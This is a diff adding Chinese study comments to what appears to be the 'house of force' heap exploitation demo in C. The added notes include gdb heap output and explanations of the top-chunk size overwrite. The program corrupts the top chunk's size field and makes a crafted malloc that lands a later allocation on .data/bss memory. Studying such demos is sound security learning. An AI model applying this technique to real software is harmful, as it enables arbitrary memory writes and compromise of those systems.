@@ -7,6 +7,9 @@
 #include <assert.h>
 
 //这个案例的主要思想并没有完全搞懂，通过指针把top chunk 的size的值改成最大值。再设置好下一次分配的内存大小，使得之后的内存分配从数据段变量bss_var处开始分配。
+//主要的一点是当top chunk在0x555555757360，且大小是 -1 的时候，malloc一个大小为0xffffffffffffeca0的块后，heap 的起始地址变成了.data段的起始地址 0x555555756000，
+//大小也变成了 0x555555756008,这样再次分配地址后确实能拿到.data的地址空间
+
 
 //疑问：
 //将.data段当作堆内存分配出去后就有了堆的读写权限？
@@ -24,7 +27,7 @@ int main(int argc , char* argv[])
 	fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.\n", p1 - 2);
 
 	fprintf(stderr, "\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
-	int real_size = malloc_usable_size(p1);
+	int real_size = malloc_usable_size(p1);//计算真实分配的空间大小
 	fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %ld.\n", real_size + sizeof(long)*2);
 
 	fprintf(stderr, "\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");
@@ -35,7 +38,7 @@ int main(int argc , char* argv[])
 
 	fprintf(stderr, "\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
 	fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
-	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
+	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;//修改了top chunk的大小
 	fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
 	//------------------------
 
@@ -43,6 +46,12 @@ int main(int argc , char* argv[])
 	fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
 	   "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
 	void *new_ptr = malloc(evil_size);
+	//分配完evil_size后，堆变成了这样，从vmmap来看，0x555555756000是 .data段的地址
+	//gdb-peda$ heap
+	//Addr: 0x555555756000
+	//Size: 0x555555756008
+
+	
 	fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr - sizeof(long)*2);
 
 	void* ctr_chunk = malloc(100);
